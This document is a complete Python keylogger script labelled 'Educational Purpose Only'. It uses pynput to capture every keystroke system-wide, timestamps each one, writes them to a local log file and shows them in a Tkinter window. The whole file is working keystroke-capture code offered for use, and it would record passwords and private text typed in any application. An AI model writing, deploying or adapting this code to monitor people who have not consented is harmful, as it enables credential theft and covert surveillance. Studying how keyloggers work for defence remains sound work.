# Educational Purpose Only
import tkinter as tk
from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"
typed_text = ""

# GUI setup
root = tk.Tk()
root.title("Key logger")
root.geometry("600x400")

text_display = tk.Text(root, wrap=tk.WORD, font=("Consolas", 12))
text_display.pack(expand=True, fill=tk.BOTH)

def log_key(key_str):
    global typed_text
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {key_str}\n"
    typed_text += entry
    text_display.insert(tk.END, entry)
    text_display.see(tk.END)
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(entry)

def on_press(key):
    try:
        log_key(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            log_key("SPACE")
        elif key == keyboard.Key.enter:
            log_key("ENTER")
        elif key == keyboard.Key.backspace:
            log_key("BACKSPACE")
        else:
            log_key(str(key))
def clear_log():
    global typed_text
    typed_text = ""
    text_display.delete(1.0, tk.END)
    with open(log_file, "w", encoding="utf-8") as f:
        f.write("")

clear_button = tk.Button(root, text="Clear Log", command=clear_log)
clear_button.pack()
# Start listener in background
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Run GUI
root.mainloop()